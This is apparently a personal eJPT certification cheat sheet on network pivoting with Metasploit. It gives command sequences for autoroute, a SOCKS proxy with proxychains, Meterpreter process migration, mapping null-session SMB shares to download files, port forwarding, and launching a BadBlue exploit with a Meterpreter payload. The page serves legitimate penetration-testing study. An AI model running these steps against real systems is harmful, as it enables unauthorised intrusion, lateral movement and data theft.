[[Root 𖣂]] | [[eJPT - Cheat Sheets]] | [[eJPT - README]]

<hr>

## proxychains

```shell
run autoroute -s <second_target_IP>/<netmask>
# This command is used in the Meterpreter session within the Metasploit Framework. It sets up a route through a compromised machine to access other networks that are not directly reachable from the attacker's machine.
```

Now, let's start the socks proxy server to access the pivot system on the attacker's machine using the proxychains tool.
First start the socks server using the Metasploit module.

```shell
background
use auxiliary/server/socks_proxy
# Creates a SOCKS4a proxy server inside Metasploit.
# Useful for pivoting — allows routing tools like proxychains or browsers through a Meterpreter session or compromised host.
show options
set SRVPORT 9050
set VERSION 4a 
exploit
jobs
```

Now, let's run nmap with proxychains to identify SMB port (445) on the pivot machine. We could also specify multiple ports. But, in this case, we are only interested in SMB service.

```shell
proxychains nmap <target_IP_2> -sT -Pn -sV -p 445
```

Now, let's use the `net view` command to find all resources shared by the <target_IP_2> machine.

```shell
# Interact with the meterpreter session again
sessions -i 1

pgrep explorer
migrate <process_ID>

shell
net view <target_IP_2>
```

We can see two shared resources. **Documents** and **K** drive. This confirms that pivot target allows Null Sessions, so we can access the shared resources. Also, we can achieve the same goal in several ways.

```shell
net use D: \\<target_IP_2>\Documents
net use K: \\<target_IP_2>\K$

# We successfully mapped the resources to D and K drives. Let's check what is inside these mapped drives.
dir D:
dir K:

cd D:\\ 
download Confidential.txt
download FLAG2.txt
```

<br>

# Windows Pivoting

**Pivoting with port forwarding**

```shell
# VICTIM 1
ipconfig
# We can observe, there is only one network adapter and we have two machine IP addresses but we cannot access “Victim Machine 2” directly from the attacker’s machine. We will add a route and then we will run an auxiliary port scanner module on the second victim machine to discover a host and open ports.
run autoroute -s <CIDR_notation> # e.g. 10.0.16.0/20

# VICTIM 2
use auxiliary/scanner/portscan/tcp
set RHOSTS <ip_victim_2> # Victim 2 was provided
exploit

# We have discovered port 80 on the pivot machine. Now, we will forward the remote port 80 to local port 1234 and grab the banner using Nmap
sessions -i 1
portfwd add -l 1234 -p 80 -r <ip_victim_2>
portfwd list

# We have forwarded the port, now use Nmap to find the running application name and version.
db_nmap -sS -sV -p 1234 localhost
```

**So just to summarize:**
- Gained access to **Victim Machine 1**.
- Added a route to its internal subnet to reach **Victim Machine 2**.
- Scanned and discovered **open ports** on Victim 2.
- **Forwarded** remote ports from Victim 2 to a **local port** on Kali for analysis.
- Used **Nmap** to identify service versions.
- Launched an exploit to gain access to **Victim Machine 2**.

### Exploitation - example

```shell
use exploit/windows/http/badblue_passthru
set PAYLOAD windows/meterpreter/bind_tcp
set RHOSTS <ip_victim_2>
exploit
```
